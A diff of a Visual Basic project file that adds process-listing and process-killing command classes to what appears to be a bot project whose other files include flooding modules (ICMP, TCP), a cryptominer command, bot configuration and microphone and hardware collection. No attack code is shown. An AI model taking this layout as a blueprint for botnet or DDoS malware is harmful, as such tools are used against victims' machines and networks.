@@ -112,7 +112,9 @@
   <ItemGroup>
     <Compile Include="Class\Commands\AllImgToJson.vb" />
     <Compile Include="Class\Commands\CommandHandler.vb" />
+    <Compile Include="Class\Commands\GetAllProcess.vb" />
     <Compile Include="Class\Commands\GetImg.vb" />
+    <Compile Include="Class\Commands\KillProcessFromId.vb" />
     <Compile Include="Class\Commands\MessageCommand.vb" />
     <Compile Include="Class\Commands\MinerCommand.vb" />
     <Compile Include="Class\Floods\Floodsbase.vb" />
@@ -147,10 +149,12 @@
     <Compile Include="Models\HardwareCollector.vb" />
     <Compile Include="Models\Json\AllImgModel.vb" />
     <Compile Include="Models\Json\ConfigBotModel.vb" />
+    <Compile Include="Models\KillProcessModel.vb" />
     <Compile Include="Models\LogModel.vb" />
     <Compile Include="Models\Json\MicroPhoneDevicesListModel.vb" />
     <Compile Include="Models\MessageModel.vb" />
     <Compile Include="Models\MiningModel.vb" />
+    <Compile Include="Models\ProcessModel.vb" />
     <Compile Include="Models\WebsiteModel.vb" />
     <Compile Include="Class\Floods\Floods\3. Layer\ICMP.vb" />
     <Compile Include="Class\Floods\Floods\4. Layer\TCP.vb" />
